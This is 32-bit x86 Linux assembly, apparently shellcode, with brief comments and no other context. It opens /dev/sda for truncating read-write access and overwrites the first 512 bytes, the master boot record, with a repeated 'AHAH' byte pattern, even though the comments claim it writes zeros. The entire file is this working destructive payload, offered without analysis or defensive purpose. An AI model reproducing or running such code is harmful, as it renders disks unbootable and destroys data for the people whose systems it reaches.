
SYS_OPEN equ		5
SYS_WRITE equ		4
O_RDWR equ		2

global _start

section .text

_start:
	; open the /dev/sda
	xor eax, eax
	push eax
	push 0x6164732f
	push 0x7665642f
	mov ebx, esp

	mov al, SYS_OPEN

	; open file with O_TRUNC
	xor ecx, ecx            ; zero out ecx
        inc ecx
        shl ecx, 9              ; store integer 512, which is the value of O_TRUNC
	add ecx, O_RDWR		; to make 512 -> 514 for O_TRUNC | O_RDWR

	int 0x80

	; write the MBR with zero's.
	; with the size of 512 bytes.
	; (128 * 4 bytes)
	mov ebx, eax		; file pointer to ebx
	xor eax, eax		; zero out eax

	xor ecx, ecx		; zero out ecx
	mov cl, 128		; counter of loop
	push eax
fill:
	push 0x48414841		; push to stack
	loop fill

	mov al, SYS_WRITE
	mov ecx, esp

	xor edx, edx		; zero out edx
	inc edx
	shl edx, 9		; store integer 512
	int 0x80
